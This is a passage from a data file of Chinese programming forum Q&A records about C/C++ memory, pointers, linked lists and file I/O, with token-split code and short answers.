但后面并没有使用到这个链表", "\n    ", "insertNodeByHead", "(List, ", "3", ");                     ", "//使用这个语句插入失败", "\n    ", "//List = insertNodeByHead(List, 3);         //使用这个语句插入成功", "\n    ", "printList", "(List);                             ", "//打印链表", "\n    ", "return", " ", "0", ";\n}\n", "\n", "下面是运行结果：", "\n", "\n", "\n", "经过这两个实验的结果，我开始认为是函数结果返回的问题，链表在传入函数之前并没有给链表分配内存，所以在函数里面headNode分配的内存地址可能和在函数外面的List地址不一样，他们指向的位置不一样，所以没有List = insertNodeByHead(List, 3);这个语句给List重新赋值的时候，List的地址没有得到更新，后续的操作都是无效的。所以我做了下面的实验进行验证：", "\n", "\n", "可以看出，地址更新后无需再次更新，后面的操作都是有效的。", "\n", "但是后面问题又来了，正当我觉得问题就是出现在这个这个点上的时候。我将struct Node* list = createList();     这个语句删除后：", "\n", "int", " main", "()", "{\n    ", "struct", " Node* List;      ", "//创建一个链表变量    未初始化 ", "\n    ", "//struct Node* list = createList();    ", "\n    ", "//insertNodeByHead(List, 3);", "\n    List = insert", "NodeByHead(List, 4)", ";\n    insert", "NodeByHead(List, 3)", ";\n    insert", "NodeByHead(List, 5)", ";\n    insert", "NodeByHead(List, 6)", ";\n    print", "List(List)", ";       \n    return ", "0", ";\n}\n\n", "\n", "运行结果又出现问题了：", "\n", "\n", "除了上面的一些实验数据，我还做了其他的实验，查看链表各运行阶段的地址变化，但都没有发现什么问题，应该指针的问题吧，我对指针也不熟悉，有没有懂的帮忙分析分析。", "\n", "下面是全部的实验代码：", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n\n", "struct", " ", "Node", "{\n    ", "int", " data;\n    ", "struct", " ", "Node", "* next;\n};\n\n", "struct", " ", "Node", "* ", "createList", "(){\n    ", "struct", " ", "Node", "* headNode = (", "struct", " Node*)", "malloc", "(", "sizeof", "(", "struct", " Node));\n    ", "//headNode成为了结构体变量 ", "\n    ", "//变量使用前必须初始化 ", "\n    ", "//headNode->data = 1; ", "\n    headNode->next = ", "NULL", ";\n    ", "return", " headNode;\n}\n\n", "//创建节点", "\n", "struct", " ", "Node", "* ", "createNode", "(", "int", " data){\n    ", "struct", " ", "Node", "* newNode = (", "struct", " Node*)", "malloc", "(", "sizeof", "(", "struct", " Node));\n    newNode->data = data;\n    newNode->next = ", "NULL", ";\n    ", "return", " newNode;\n}\n\n", "void", " ", "printList", "(", "struct", " Node* headNode)", "{\n    ", "struct", " ", "Node", "* pMove = headNode;\n    ", "while", "(pMove){\n        ", "printf", "(", "\"%d\\t\"", ", pMove->data);\n        pMove = pMove->next;\n        ", "printf", "(", "\"`\"", ");\n    }\n    ", "printf", "(", "\"\\n\"", ");\n} \n\n", "//插入节点，参数：插入那个链表，插入节点的数据是多少", "\n", "struct", " ", "Node", "* ", "insertNodeByHead", "(", "struct", " Node* headNode, ", "int", " data){\n    ", "struct", " ", "Node", "* newNode = ", "createNode", "(data);\n    ", "if", "(headNode==", "NULL", "){\n        headNode = (", "struct", " Node*)", "malloc", "(", "sizeof", "(", "struct", " Node));\n        headNode->data = ", "9", ";\n        headNode->next = ", "NULL", ";\n    }\n    newNode->next = headNode->next; ", "//此时两个节点共同指向下一个节点 ", "\n    headNode->next = newNode;       ", "//现在headNode节点指向newNode节点", "\n    ", "return", " headNode; \n} \n\n", "//删除指点节点 ", "\n", "int", " ", "deleteNodeByAppoint", "(", "struct", " Node* headNode, ", "int", " posData)", "{\n    ", "struct", " ", "Node", "* posNode = headNode->next;\n    ", "struct", " ", "Node", "* posNodeFront = headNode;\n    ", "if", "(posNode==", "NULL", "){\n        ", "printf", "(", "\"删除失败，无法删除空链表！\\n\"", ");\n        ", "return", " ", "0", ";\n    }\n    ", "else", "{\n        ", "while", "(posNode!=", "NULL", "){\n            ", "if", "(posNode->data == posData){\n                posNodeFront->next = posNode->next;\n                ", "free", "(posNode);\n                ", "return", " ", "1", ";\n            }\n            posNodeFront = posNode;\n            posNode = posNodeFront->next;\n        }\n        ", "printf", "(", "\"没有找到相关数据，无法删除！\\n\"", ");\n    }\n}\n\n", "int", " ", "main", "()", "{\n    ", "struct", " ", "Node", "* List;      ", "//创建一个链表变量    未初始化 ", "\n    ", "//struct Node* list = createList();    ", "\n    ", "//insertNodeByHead(List, 3);", "\n    List = ", "insertNodeByHead", "(List, ", "4", ");\n    ", "insertNodeByHead", "(List, ", "3", ");\n    ", "insertNodeByHead", "(List, ", "5", ");\n    ", "insertNodeByHead", "(List, ", "6", ");\n    ", "printList", "(List);       \n    ", "return", " ", "0", ";\n}\n\n\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;那应该检查一下你传递的path到底是什么值了啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问，为什么我不能用将文件跳过某段数据读取到缓冲区后删除文件再创建一个同路径同名文件后将缓冲区的数据写入到该文件的方法来删除文件中的指定段落", ["\nvoid delete_file_paragraphs(char* path,long head_offset,long trail_offset){\n    FILE* fp=fopen(path,", "\"rb+\"", ");", "//", "打开被操作文件\n    ", "/*先以长度不清零的方式打开被操作文件，用从头顺序读取的方式跳过要删除的区间，将读取到的数据存入缓存，删除被操作文件，以从头写入并创建文件的方式打开之前被操作文件的路径，将缓存数据写入文件，释放缓存*/", "\n    ", "if", "(fp!=NULL){\n        fseek(fp,", "0", ",SEEK_END);", "//", "被操作文件偏移到文件尾\n        long file_trail=ftell(fp);", "//", "保存了被操作文件尾的偏移量，和文件长度\n        char* BUF_=(char*)malloc(sizeof(char)*(file_trail-head_offset));", "//", "建立缓存区用来保存文件数据\n        long count=", "0", ";", "//", "计数变量\n        long offset_CUR=", "0", ";", "//", "用于保存文件当前偏移量\n        ", "for", "(fseek(fp,", "0", ",SEEK_SET);file_trail!=offset_CUR;count++){\n            ", "if", "(offset_CUR==head_offset){\n                fseek(fp,(trail_offset-head_offset),SEEK_CUR);\n            }", "//", "跳过区间\n            fscanf(fp,", "\"%c\"", ",BUF_+count);", "//", "将从文件获取到的数据存入缓冲区\n            offset_CUR=ftell(fp);", "//", "获取当前偏移量\n        }", "//", "将文件指定内容写入缓存\n        fclose(fp);", "//", "关闭文件\n        remove(path);", "//", "删除文件\n        fp=fopen(path,", "\"w\"", ");", "//", "创建并打开文件\n        ", "//", "fp=fopen(", "\"C:\\\\Users\\\\user\\\\Desktop\\\\新建文本文档30.txt\"", ",", "\"w\"", ");\n        ", "for", "(count=", "0", ";count<file_trail-", "4", ";count++){\n            fprintf(fp,", "\"%c\"", ",*(BUF_+count));", "//", "从缓存向文件写入数据\n            printf(", "\"%c\"", ",*(BUF_+count));\n        }", "//", "将缓存数据写入文件\n        free(BUF_);", "//", "释放缓存\n        fclose(fp);", "//", "关闭文件\n    }\n}", "//", "根据段首和段尾的偏移量删除文件中的任意段落。形参", "1", "为被操作文件的路径，形参", "2", "为段落首部偏移量，形参", "3", "为段落尾部偏移量\n", "\n", "/", "附上如上代码", "/", "\n", "现象是执行前和执行后的文件内容没有变化，但是将第20和第21行改成——", "\n", "//fp=fopen(path,\"w\");//创建并打开文件", "\n", "fp=fopen(\"C:\\Users\\user\\Desktop\\新建文本文档30.txt\",\"w\");", "\n", "——这样后，新建文本文档30.txt中的内容是正确的"]], "Tag": "程序设计"}
{"Answer": "if((in1==NULL)||(out==NULL)){\r\n}\r\n out是什么, (out==NULL)一直满足?", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++读取.dat文件的问题，急求大家解答！！", ["急求大家解答，我现在在用C++利用MFC建界面，需要读取一个.dat文件并将文件放到数组中，但是现在我发现数组申请地址时失败了，求大神指点该怎么修改", "\n读取.dat文件的代码：", "\nvoid CcftDlg::OnBnClickedButton1()", "\n{", "\nCFileDialog m_dlg(1,_T(\"dat\"),NULL,NULL,_T(\"dat(*.dat)|*.dat|*(*.*)|*.*\"),this);", "\n    if (m_dlg.DoModal()==IDOK)", "\n    {", "\n        CString filename =m_dlg.GetPathName();", "\n        str = filename;", "\n        infile.open(str,ios::in|ios::binary);", "\n    } ", "\n    }", "\n    其中，infile的定义是 fstream infile;", "\n    数组的定义是：", "\n    BOOL Ctest12Dlg::OnInitDialog()", "\n    {", "\n    in = (fftw_complex *) fftw_malloc(sizeof(fftw_complex) * N);", "\n  if((in1==NULL)||(out==NULL)){", "\n        s1.Format(\"内存申请失败......\\r\\n\");", "\n        log=s1+log;", "\n        SetDlgItemText(IDC_EDIT1,log);", "\n        }", "\n    结果一打开界面就发现IDC_EDIT1对应的进度框显示“内存申请失败”"]], "Tag": "程序设计"}
{"Answer": "```\r\n #include&lt;iostream&gt;\r\nusing namespace std;\r\nint main(void) {\r\n\tint *p=NULL; //修改\r\n\tp=(int*)malloc(sizeof(int));//修改\r\n\t*p=3;\r\n\tprintf(\"p=%p\\n\",p);\r\n\tprintf(\"*p=%d\\n\",*p);\r\n\tp=(int*)realloc(p,sizeof(int));\r\n\tprintf(\"p=%p\\n\",p);\r\n\tprintf(\"*p=%d\\n\",*p);\r\n\r\n\tp=(int*)realloc(p,3*sizeof(int));\r\n\tprintf(\"p=%p\\n\",p);\r\n\tprintf(\"*p=%d\\n\",*p);\r\n\r\n\trealloc(p,0);\r\n\tp=NULL;\r\n\treturn 0;\r\n}\r\n```\r\n运行结果：\r\np=01017A10\r\n*p=3\r\np=01017980\r\n*p=3\r\np=01011A80\r\n*p=3\r\n请按任意键继续. . .", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["各位，下面程序的运行结果 是什么", ["#include ", "\n#include ", "\n\n", "int main(void) {", "\n    int ", "p=NULL;", "\n    p=(int", ")malloc(sizeof(int));", "\n    *p=3;", "\n    printf(\"p=%p\\n\",p);", "\n    printf(\"*p=%d\\n\",*p);", "\n\n", "p=(int*)realloc(p,sizeof(int));\nprintf(\"p=%p\\n\",p);\nprintf(\"*p=%d\\n\",*p);\n\np=(int*)realloc(p,3*sizeof(int));\nprintf(\"p=%p\\n\",p);\nprintf(\"*p=%d\\n\",*p);\n\nrealloc(p,0);\np=NULL;\nreturn 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;code class=\"language-javascript\"&gt;p&lt;/code&gt;是&lt;code class=\"language-javascript\"&gt;char*&lt;/code&gt;类型指针&amp;#xff0c;其大小等于架构字长&amp;#xff0c;即在64位程序中是8个字节&amp;#xff0c;在32位程序中是4个字节&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言字符串与指针问题解答", ["#include <stdio.h>", "#include <stdlib.h>", "#include <string.h>", "int main()", "{", "    //指针与字符串", "    char a[]=\"helloworld\";//定义一个字符数组，字符数组内容为helloworld\\0", "    char *p=a;", "    printf(\"%s\\n\",p);", "\n", "p=", "\"abcdef\"", ";", "//", "字符串常量存文字变量区，“”在使用时，取的是字符串常量首元素地址\n//文字常量区内容不能改变\n", "printf", "(", "\"%s\\n\"", ",p);\n\n", "printf", "(", "\"%d\\n\"", ", sizeof(p));", "//", "8", "\n", "printf", "(", "\"%d\\n\"", ", sizeof(", "\"abcdef\"", "));", "//", "7", "\n\n", "printf", "(", "\"%d\\n\"", ", strlen(p));", "//", "7", "\n", "printf", "(", "\"%d\\n\"", ", strlen(", "\"abcdef\"", "));", "//", "6", "\n\n\n", "return", " ", "0", ";\n", "\n", "}", "请问 printf(\"%d\\n\", sizeof(p));//8 这句语句执行结果为什么是8呢"]], "Tag": "程序设计"}
{"Answer": "![图片说明](https://img-ask.csdn.net/upload/201802/02/1517564950_103189.png)\r\n\r\n刚学习一定要多调试代码。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言二维数组存储字符串问", ["代码如下，使用二维数组存储字符串，buf[4]为什么不等于NULL", "\n\n", " void main()\n{\n    char buf[][10] = {\n        \"1111\",\n        \"2222\",\n        \"3333\",\n        \"4444\",\n        NULL\n    };\n\n    printf(\"sizeof buf = %d\\r\\n\", sizeof(buf));\n\n    if (buf[4] != NULL){\n        printf(\"buf[4] != NULL\\n\");\n    }\n    system(\"pause\");\n}\n", "\n\n", "运行结果如下：", "\n\n"]], "Tag": "程序设计"}
{"Answer": "问题出在 S = (SqList *)malloc(sizeof(SqList));这条语句要删除。\r\n实参&amp;Sa在子函数中被malloc修改为S，返回后S不存在，当然也修改不了length。\r\n值传递，地址传递，实际上都是值传递。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["使用了指针，但是函数的形参仍然无法传递给实参", ["这是个顺序表，自定义的函数MakeEmpty(SqList *S)对顺序表进行初始化，但是初始化后的S的形参的值length=0，无法传递给实参。请问是为什么啊，然后怎么在这个函数内部能让形参传递给实参呢？", "\n\n", "#include<stdio.h>\n#include<stdlib.h>\n\n#define MAXSIZE 27/*存储空间初始分配量*/\ntypedef int ElemType;/*ElemType类型根据实际情况而定，这里假设为int*/\n\ntypedef struct\n{/*线性表的顺序存储结构*/\n    ElemType data[MAXSIZE];/*数组存储数据元素*/\n    int length;/*线性表的当前长度*/\n}SqList;\n\nvoid MakeEmpty(SqList *S)\n{/*初始化顺序表*/\n    S = (SqList *)malloc(sizeof(SqList));\n    S->length = 1;\n}\n\nint main(void)\n{\n    SqList Sa;MakeEmpty(&Sa);\n    SqList Sb;MakeEmpty(&Sb);\n    SqList Sc;MakeEmpty(&Sc);\n\n    return 0;\n}\n", "\n\n", "测试效果", "\n运行时，形参的值是改变了的", "\n\n", "但是这个形参s的length值却没有传递个实参"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;显然L-&amp;gt;next你没有设置为NULL&lt;br /&gt;98行编译怎么通过的呢&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["我不懂为什么会报错！(语言-c语言)", ["\n", " 问题遇到的现象和发生背景 ", "\n", "用代码块功能插入代码，请勿粘贴截图", "\n", "#", "define", " _CRT_SECURE_NO_WARNINGS 1", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<malloc.h>", "\n", "#", "include", " ", "<assert.h>", "\n", "typedef", " ", "int", " SListDataType;\n", "typedef", " ", "struct", " ", "SListNode", "\n{\n    SListDataType data;\n    ", "struct", " ", "SListNode", "* next;\n}SListNode;\n\n\n", "SListNode* ", "CreatSListNode", "(SListDataType x)", "\n", "{\n    SListNode* Newnode = (SListNode*)", "malloc", "(", "sizeof", "(SListNode));\n    ", "if", " (Newnode == ", "NULL", ")\n    {\n        ", "printf", "(", "\"申请内存失败！\"", ");\n        ", "exit", "(", "-1", ");\n    }\n    Newnode->data = x;\n    Newnode->next = ", "NULL", ";\n    ", "return", " Newnode;\n\n}\n", "//void InitSList(SListNode *L)", "\n", "//{", "\n", "//    L = (SListNode*)malloc(sizeof(SListNode));", "\n", "//    L->data = 0;", "\n", "//    L->next = NULL;", "\n", "//", "\n", "//}", "\n", "SListNode * ", "InitSList", "()", "\n", "{\n    SListNode* L = (SListNode*)", "malloc", "(", "sizeof", "(SListNode));\n    L->data = ", "0", ";\n    L->next = ", "NULL", ";\n    ", "return", " L;\n}\n", "void", " ", "HeadInsertSList", "(SListNode* L,SListDataType x)", "\n", "{\n    SListNode* Newnode = (SListNode*)", "malloc", "(", "sizeof", "(SListNode));\n    Newnode->data = x;\n    Newnode->next = L->next;\n    L->next = Newnode;\n    L->data++;\n}\n", "void", " ", "TailInsertSList", "(SListNode* L, SListDataType x)", "\n", "{\n\n    SListNode* p=", "CreatSListNode", "(x);\n    SListNode* cur = L;\n    ", "while", " (cur->next != ", "NULL", ")\n    {\n        cur = cur->next;\n    }\n    cur->next= p;\n    L->data++;\n\n    \n\n}\n", "void", " ", "EraseSList", "(SListNode* L, SListDataType x)", "\n", "{\n    SListNode* pre = L;\n    SListNode* cur = L->next;\n    ", "while", " (cur)\n    {\n        ", "if", " (cur->data == x)\n        {\n            pre->next = cur->next;\n            ", "free", "(cur);\n        }\n        pre = cur;\n        cur = cur->next;\n    }\n}\n", "void", " ", "PrintSList", "(SListNode *L)", "\n", "{\n    SListNode* p = L->next;\n    ", "while", " (p!=", "NULL", ")\n    {\n        ", "printf", "(", "\"%d->\"", ", p->data);\n        p = p->next;\n    }\n    ", "printf", "(", "\"NULL\"", ");\n}\n\n\n\n\n", "int", " ", "main", "()", "\n", "{\n    SListNode*  L=", "InitSList", "();\n    L->next = ", "NULL", ";\n    L->data = ", "0", ";\n    ", "InitSList", "(L);\n    ", "HeadInsertSList", "(L, ", "1", ");\n    ", "HeadInsertSList", "(L, ", "2", ");\n    ", "HeadInsertSList", "(L, ", "3", ");\n    ", "HeadInsertSList", "(L, ", "4", ");\n    ", "TailInsertSList", "(L, ", "5", ");\n    ", "TailInsertSList", "(L, ", "6", ");\n    ", "TailInsertSList", "(L, ", "7", ");\n    ", "TailInsertSList", "(L, ", "8", ");\n    ", "EraseSList", "(L, ", "3", ");\n    ", "PrintSList", "(L);\n\n\n    ", "return", " ", "0", ";\n}\n\n\n\n", "\n", "运行结果及报错内容", "\n"]], "Tag": "程序设计"}
{"Answer": "一个在看下参数说明，一个看下有没有访问权限。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["求助啊在线等   C#调用C++生成的dll，dll中有个函数是修改文件内容的操作的但是怎么都打不开文件", ["FILE *fp;", "\n            LinkList p, q, E, T;", "\n\n", "        E = (LinkList)malloc(sizeof(LNode));\n        E->next = NULL;\n        fp = fopen(\"login.txt\", \"r+\");\n        if (fp == NULL) {\n            exit(0);\n        }\n        程序执行到 fp = fopen(\"login.txt\", \"r+\");，然后判断fp，但是结果是空，但是如果用\"r\"时可以打开的，就是只能读文件内容但是不能写.。。希望大神指点，悬赏不多，不经常逛论坛谢谢\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;初始化方法是错的。既然111行已经给头指针申请了空间&amp;#xff0c;那么初始化函数里就直接用&amp;#xff0c;不要再申请一次了。第21行删除掉&lt;br /&gt;第100行也是没有意义的代码&amp;#xff0c;删除掉&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["要求用链表加结构体完成如下简易的图书管理程序，运行时出现报错如下图，想请教一下应该怎么改。", ["\n", "![img](", "https://img-mid.csdnimg.cn/release/static/image/mid/ask/703417304736160.png", " \"#left\"）", "\n", "#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\n#include<malloc.h>\ntypedef struct info\n{\n    int num;\n    char ", "name", "[", "20", "];\n    char author[", "20", "];\n    int price;\n};\n\ntypedef struct node\n{\n    info book;\n    struct node* next;\n}node;\n\nvoid initiatesl(node* h)\n{\n    h = (node*)malloc(sizeof(node));\n    ", "h", "->", "next = NULL;\n}\n\nvoid add(node* h, info* p)\n{\n    node* q, * t;\n    q = (node*)malloc(sizeof(node));\n    t = (node*)malloc(sizeof(node));\n    ", "q", "->", "book", ".num = p->", "num;\n    ", "strcpy", "(q->", "book", ".", "name", ", p->", "name", ");\n    ", "strcpy", "(q->", "book", ".author, p->", "author);\n    ", "q", "->", "book", ".price = p->", "price;\n    ", "if", " (h->", "next == NULL)\n        ", "h", "->", "next = q;\n    ", "else", " t->", "next = q;\n    t = q;\n    ", "t", "->", "next = NULL;\n}\n\nvoid delete_(node* h, int i)\n{\n    node* p, * s;\n    int j;\n    p = h;\n    j = ", "0", ";\n    ", "while", " (p->", "next != NULL && j < i - ", "1", ")\n    {\n        ", "p", " = p->", "next;\n        j++;\n    }\n    ", "if", " (j != i - 1 || p->", "next == NULL)\n    {\n        printf(", "\"i is invalid \\n\"", ");\n        exit(", "0", ");\n    }\n    ", "s", " = p->", "next;\n    ", "p", "->", "next", " = s->", "next;\n    free(s);\n}\n\nvoid print(node* h);\n\nvoid sort(node* h)\n{\n    node* x;\n    node* h1;\n    h1= (node*)malloc(sizeof(node));\n    initiatesl(h1);\n    ", "while", " (h->", "next != NULL) {\n        ", "x", " = h->", "next;\n        int i = ", "0", ", minnum = ", "1", ";\n        int min = ", "0", ";\n        ", "min", " = x->", "book.price;\n        node* p, * t;\n        p = (node*)malloc(sizeof(node));\n        t = (node*)malloc(sizeof(node));\n        ", "while", " (x != NULL) {\n            ", "if", " (x->", "book.price < min) {\n                minnum = i + ", "1", ";\n                ", "min", " = x->", "book.price;\n                p = x;\n            }\n            i++;\n            ", "x", " = x->", "next;\n        }\n        ", "if", " (h1->", "next == NULL)\n            ", "h1", "->", "next = p;\n        ", "else", " t->", "next = p;\n        t = p;\n        delete_(h, minnum);\n    }\n    print(h1);\n}\n\nvoid print(node* h)\n{\n    printf(", "\"编号\\t书名\\t作者\\t价钱\\n\"", ");\n    node* x;\n    x = (node*)malloc(sizeof(node));\n    ", "x", " = h->", "next;\n    ", "while", " (x != NULL) {\n        ", "printf", "(\"%d\\t%s\\t%s\\t%d\\n\", x->", "book", ".num, x->", "book", ".", "name", ", x->", "book", ".author, x->", "book.price);\n        ", "x", " = x->", "next;\n    }\n}\n\nint main()\n{\n    node* h;\n    h = (node*)malloc(sizeof(node));\n    initiatesl(h);\n    info ", "data", "[", "4", "];\n    ", "data", "[", "0", "] = { ", "100001", ",", "\"Basic\"", ",", "\"zhang\"", ",", "15", " };\n    ", "data", "[", "1", "] = { ", "200022", ",", "\"VB\"", ",", "\"Li\"", ",", "20", " };\n    ", "data", "[", "2", "] = { ", "383283", ",", "\"C\"", ",", "\"Wang\"", ",", "18", " };\n    ", "data", "[", "3", "] = { ", "324444", ",", "\"delphi\"", ",", "\"Zhao\"", ",", "23", " };\n    ", "for", " (int i = ", "0", "; i < ", "4", "; i++) {\n        add(h, &", "data", "[i]);\n    }\n    print(h);\n    printf(", "\"删除第二个\\n\"", ");\n        delete_(h, ", "2", ");\n    print(h);\n    printf(", "\"排序完成后\\n\"", ");\n    sort(h);\n\n    return ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;两个node-&amp;gt;next&amp;#61;null加上&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么最后会疯狂输出地址？要怎么更改？", ["两个链表的合并成一个链表，用−1表示序列的结尾（−1不属于这个序列）", "\n", "\n", "#include<iostream>", "\n", "#include<malloc.h>", "\nusing namespace std;\ntypedef struct node{\n    int data;\n    node *next;\n}LinkListNode;\nint main(){\n    int x;\n    LinkListNode *head,*node,*p;\n    head=(LinkListNode*)malloc(sizeof(LinkListNode)) ;\n    cin>>x;\n    head->", "data", "=x;\n    head->", "next", "=", "NULL", ";\n    ", "p", "=node=head;\n    ", "while", "(x!=-1){\n        cin>>x;\n        ", "if", "(", "x", "==-1){\n            break;\n        }\n        node=(LinkListNode*)malloc(sizeof(LinkListNode));\n        node->", "data", "=x;\n        p->", "next", "=node;\n        ", "p", "=node;\n    }\n    LinkListNode *head_,*node_,*p_;\n    head_=(LinkListNode*)malloc(sizeof(LinkListNode));\n    cin>>x;\n    head_->", "data", "=x;\n    head_->", "next", "=", "NULL", ";\n    ", "p_", "=node_=head_;\n    ", "while", "(x!=-1){\n        cin>>x;\n        ", "if", "(", "x", "==-1){\n            break;\n        }\n        node_=(LinkListNode*)malloc(sizeof(LinkListNode));\n        node_->", "data", "=x;\n        p_->", "next", "=node_;\n        ", "p_", "=node_;\n    }\n    node->", "next", "=head_;\n    ", "p", "=head;\n    ", "while", "(p){\n        cout<<p->data<<", "\" \"", "; \n        ", "p", "=p->next;\n    }\n    \n}\n", "\n"]], "Tag": "程序设计"}
{"Answer": "write和read两条语句最后少了一个右括号')' ；少定义了一个结构体变量b。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["怎么通过FIFO（有名管道）传递结构体？", ["我想通过FIFO传送一个结构体", "\n\n", "    struct test\n    {\n    float x;\n    float y;\n    };\n    struct test a={1.00,2.00};\n\n    //写端：\n    write(writefd,&a,sizeof(struct test);\n\n    //读端：\n    read(readfd,&b,sizeof(struct test);\n    float x=b.x;\n    float y=b.y;\n\n", "\n\n", "结果读到数字都是0.000000，哪里出了问题，应该怎么传送结构体？"]], "Tag": "程序设计"}
{"Answer": "byte数组本来就是一些char数据。直接用加密tool对比结果", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["aescbc加解密程序，调用了openssl库，在输出时为什么密文长度总是和初始向量长度一样？", ["        memset(miyao, 0, 17);\n                GetDlgItemText(hwnd,IDC_EDIT1,ivec,sizeof(ivec));\n                GetDlgItemText(hwnd,IDC_EDIT2,miyao,sizeof(miyao));\n                GetDlgItemText(hwnd,IDC_EDIT3,in,sizeof(in));\n                length=strlen(in);\n        AES_set_encrypt_key(miyao, 128, &ckey);\n        AES_cbc_encrypt( in,out,length,&ckey,ivec, AES_ENCRYPT);\n        sprintf_s(out,\"%X\",out);\n        SetDlgItemText(hwnd,IDC_EDIT4,out);\n            }\n", "\n\n"]], "Tag": "程序设计"}
{"Answer": "没给HC[i]没申请动态空间", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言文件/哈夫曼树/算法/二叉树", [" 在一个函数中，下面这两行运行无错误\nfp=fopen(\"CodeFile.dat\",\"wb\");\nfwrite(HC[i],sizeof(char),strlen(HC[i])+1,fp);\n//其中HC的类型是char **\n\n//然后在另外一个函数中加入\nfp=fopen(\"CodeFile.dat\",\"rb\");\nfor(int i=1;i<=n;i++)\n    fread(HC[i].sizeof(char),strlen(HC[i])+1,fp);\n//就不行了，老是运行到这三行就出错。！！\n//补充一些\ntypedef char ** HuffmanCode;\nHuffmanCode HC;\nHC = （HuffmanCode）malloc((n+1)*sizeof(char *));\n//求救\n"]], "Tag": "程序设计"}
{"Answer": "因为对文件，内部读写有不同的指针。读与写之间要重新fseek一下。\n可以在16行fwrite之前增加：\npos1 = ftell(pFile2);\nfseek(pFile2, pos1, SEEK_SET);", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["文件 rb+ 模式的读写问题", ["typedef struct NEW_MAN", "\n{", "\n    int num;", "\n    char name[10];", "\n}MAN;", "\n\n", "void write_content()", "\n{", "\n    FILE* pfile1 = fopen(\"c:\\test_space\\test_struct_w+.dat\", \"wb\");", "\n    MAN data[3] = { { 1, \"s\" }, { 2, \"z\" }, { 3, \"r\" } };", "\n    fwrite(data, sizeof(MAN), 3, pfile1);", "\n    fclose(pfile1);", "\n}", "\n\n", "int main(int argc, char* argv[])", "\n{", "\n    write_content();", "\n    struct stat mystat1 = { 0 };", "\n    stat(\"c:\\test_space\\test_struct_w+.dat\", &mystat1);", "\n    int len = (mystat1.st_size)/(sizeof(MAN));", "\n\n", "FILE* pfile2 = fopen(\"c:\\\\test_space\\\\test_struct_w+.dat\", \"rb+\");\n//fseek 测试\nfseek(pfile2, sizeof(MAN), SEEK_SET);\nint pos1 = ftell(pfile2);//16\n\n//\nMAN data_tmp = { 0 };\nfread(&data_tmp,sizeof(MAN),1,pfile2);\nprintf(\"%d,%s\\n\", data_tmp.num, data_tmp.name);\n//1.为什么加了fread（上面的三行代码），下面的fwrite就不起作用了，也就是写入不了\n\n\n\n\nMAN myman2 = { 4, \"zz\" };\nfwrite(&myman2, sizeof(MAN), 1, pfile2);\nint pos2 = ftell(pfile2);//32\n\nfseek(pfile2, 0, SEEK_SET);\nMAN data2[3] = { 0 };\nfread(data2, sizeof(data2), 3, pfile2);\nint pos3 = ftell(pfile2);//48\n\nfor (int i = 0; i < len; i++)\n{\n    printf(\"%d,%s\\n\", data2[i].num, data2[i].name);\n}\nfclose(pfile2);\n\n\nsystem(\"pause\");\nreturn 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
